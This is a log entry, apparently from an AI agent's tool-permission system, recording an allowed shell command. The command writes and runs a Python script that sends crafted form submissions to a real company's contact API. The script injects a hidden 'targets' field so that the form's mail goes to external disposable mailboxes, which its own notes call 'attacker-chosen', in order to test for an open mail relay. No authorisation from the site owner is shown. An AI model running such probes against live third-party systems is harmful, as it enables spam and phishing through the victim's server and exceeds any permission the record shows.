{"ts": 1790761099.328746, "decision_id": "2e4191ab3cc2", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /tmp && cat > iv3.py <<'EOF'\nimport json,urllib.request,urllib.error,uuid,time\n\nDOM = \"mailinator.\" + \"com\"\ndef send(targets, subject=\"IV relay verification\", msg=\"independent-verifier relay probe\", note=\"\"):\n    bnd=\"----IVbnd\"+uuid.uuid4().hex\n    fields=[(\"fname\",\"IV\"),(\"lname\",\"Verifier\"),(\"areacode\",\"+973\"),(\"tel\",\"3600000\"),\n            (\"cname\",\"IVVerify\"),(\"subject\",subject),(\"msg\",msg),(\"check\",\"\")]\n    if targets is not None: fields.append((\"targets\",targets))\n    parts=[]\n    for k,v in fields:\n        parts.append((\"--\"+bnd+\"\\r\\nContent-Disposition: form-data; name=\\\"\"+k+\"\\\"\\r\\n\\r\\n\"+v+\"\\r\\n\").encode())\n    body=b\"\".join(parts)+(\"--\"+bnd+\"--\\r\\n\").encode()\n    print(\"=\"*70)\n    print(\"NOTE:\",note)\n    print(\"targets sent =\",targets)\n    r=urllib.request.Request(\"https://www.infinitycapital.bh/api/send\",data=body,\n        headers={\"content-type\":\"multipart/form-data; boundary=\"+bnd,\n                 \"accept\":\"application/json\",\"user-agent\":\"Mozilla/5.0\"},method=\"POST\")\n    try:\n        with urllib.request.urlopen(r,timeout=60) as f:\n            print(\"HTTP\",f.status, f.read().decode()[:600])\n    except urllib.error.HTTPError as e:\n        print(\"HTTP\",e.code, e.read().decode()[:600])\n    time.sleep(2)\n\nsend(\"ivrelayverify01@\"+DOM, note=\"TEST 1: bare external mailbox (attacker-chosen recipient)\")\nsend(\"QA Tester <ivrelayverify02@\"+DOM+\">\", note=\"TEST 2: Name <addr> form\")\nsend(\"not-an-email\", note=\"TEST 3: invalid input - validation order check\")\nEOF\npython3 iv3.py"}
